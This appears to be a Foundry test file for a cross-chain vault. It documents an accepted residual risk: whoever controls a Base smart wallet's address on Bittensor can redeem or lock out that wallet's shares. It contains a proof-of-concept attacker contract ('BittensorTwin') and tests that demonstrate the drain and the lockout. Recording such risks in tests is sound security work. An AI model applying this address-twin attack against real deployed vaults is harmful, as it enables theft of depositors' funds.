// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

import {CascadeVault} from "../../src/CascadeVault.sol";
import {DIRECT_ORIGIN} from "../../src/CascadeConstants.sol";
import {VaultTestBase} from "../VaultTestBase.sol";

/// The code a different party places at a Base smart wallet's address on Bittensor (a CREATE twin, or a CREATE2 wallet
/// redeployed with its original owners): it exits directly with whatever the vault holds for its address.
contract BittensorTwin {
    address public immutable thief;

    constructor(address t) {
        thief = t;
    }

    function take(CascadeVault v) external {
        require(msg.sender == thief, "not the thief");
        v.redeemDirect(v.balanceOf(address(this)), false);
        (bool ok,) = thief.call{value: address(this).balance}("");
        require(ok, "forward");
    }

    receive() external payable {}
}

/// @notice ChatGPT R2 claim B (R6; a stated residual, the founder's decision: no contract change before the self-funded
/// launch): shares a Base door minted to address X are redeemable by whoever controls X on Bittensor (contracts/README.md,
/// "Who can use direct access"), since the origin by chain gates doors only, never redeemDirect. An EOA is the same party
/// on both chains; a contract wallet need not be. The claim has no deadline: the twin can wait for the balance to grow.
contract SmartWalletTwinTest is VaultTestBase {
    /// The smart wallet's address on Base (a Safe, a Coinbase Smart Wallet, a 4337 account).
    address wallet = makeAddr("baseSmartWallet");
    address mallory = makeAddr("mallory");
    uint256 constant ROUNDING = 1e10;

    /// The wallet's Base deposit, delivered and still fresh, is taken whole by the twin's direct exit: no origin check,
    /// no door hold, no allowance; the other holder is untouched; the wallet's own Base redeem then burns nothing.
    function test_aTwinOnBittensorTakesABaseWalletsShares() public {
        // 1. Base: the wallet's deposit delivered, fresh (no matureShares); a second holder beside it
        deliver(BASE, frontDoor, ++nextBatchId, entries1(wallet, 10e18), noEntries());
        depositVia(alice, 10e18);
        uint256 shares = vault.balanceOf(wallet);
        assertGt(shares, 0, "minted to the wallet's address");
        assertEq(vaultLens.redeemOrigin(wallet), BASE, "origin Base");
        (, uint128 fresh) = vaultLens.freshShares(wallet);
        assertGt(fresh, 0, "still inside the door hold");

        // 2. Bittensor: a different party's code at the same address
        vm.etch(wallet, address(new BittensorTwin(mallory)).code);

        // 3. the twin exits directly
        uint256 alices = vault.balanceOf(alice);
        uint256 before = mallory.balance;
        vm.prank(mallory);
        BittensorTwin(payable(wallet)).take(vault);
        assertEq(vault.balanceOf(wallet), 0, "the wallet's shares burned");
        assertApproxEqAbs(mallory.balance - before, 10e18, ROUNDING, "their TAO is the twin's");
        assertEq(vault.balanceOf(alice), alices, "the other holder untouched");

        // 4. the wallet's own Base redeem now burns nothing and queues nothing
        uint256 pending = vaultLens.pendingPayouts();
        deliver(BASE, frontDoor, ++nextBatchId, noEntries(), entries1(wallet, shares));
        assertEq(vaultLens.pendingPayouts(), pending, "nothing queued for the wallet on Base");
    }

    /// The twin can also lock the wallet out of its door without moving anything: DIRECT_ORIGIN makes every Base redeem
    /// for the address RedeemSkipped (its request fee spent), even while the vault is paused.
    function test_aTwinOnBittensorLocksTheWalletOutOfItsDoor() public {
        depositVia(wallet, 10e18);
        uint256 held = vault.balanceOf(wallet);
        vm.prank(guardian);
        vault.pause();
        vm.prank(wallet); // whoever controls the address on Bittensor
        vault.setRedeemOrigin(DIRECT_ORIGIN);
        vm.prank(owner);
        vault.unpause();

        uint256 pending = vaultLens.pendingPayouts();
        deliver(BASE, frontDoor, ++nextBatchId, noEntries(), entries1(wallet, held));
        assertEq(vault.balanceOf(wallet), held, "Base's redeem skipped");
        assertEq(vaultLens.pendingPayouts(), pending, "nothing queued");
    }

    /// The flip, then the harvest: once the twin set DIRECT_ORIGIN, a later Base deposit for the wallet still mints (a
    /// DIRECT_ORIGIN holder is minted for, CascadeBatchLib's credit), the wallet's Base redeem is skipped, and the twin
    /// takes old and new shares alike with redeemDirect.
    function test_aTwinThatFlippedTheOriginHarvestsLaterBaseDeposits() public {
        depositVia(wallet, 10e18);
        depositVia(alice, 10e18);
        vm.etch(wallet, address(new BittensorTwin(mallory)).code);
        vm.prank(wallet);
        vault.setRedeemOrigin(DIRECT_ORIGIN);

        // a later Base deposit for the wallet mints and leaves DIRECT_ORIGIN
        uint256 held = vault.balanceOf(wallet);
        depositVia(wallet, 5e18);
        assertGt(vault.balanceOf(wallet), held, "the later Base deposit minted");
        assertEq(vaultLens.redeemOrigin(wallet), DIRECT_ORIGIN, "and left the twin's origin");

        // the wallet's own Base redeem is skipped
        uint256 all = vault.balanceOf(wallet);
        uint256 pending = vaultLens.pendingPayouts();
        deliver(BASE, frontDoor, ++nextBatchId, noEntries(), entries1(wallet, all));
        assertEq(vault.balanceOf(wallet), all, "Base's redeem skipped");
        assertEq(vaultLens.pendingPayouts(), pending, "nothing queued");

        // the twin takes both deposits' value
        uint256 before = mallory.balance;
        vm.prank(mallory);
        BittensorTwin(payable(wallet)).take(vault);
        assertEq(vault.balanceOf(wallet), 0);
        assertApproxEqAbs(mallory.balance - before, 15e18, ROUNDING, "both deposits' TAO is the twin's");
    }
}
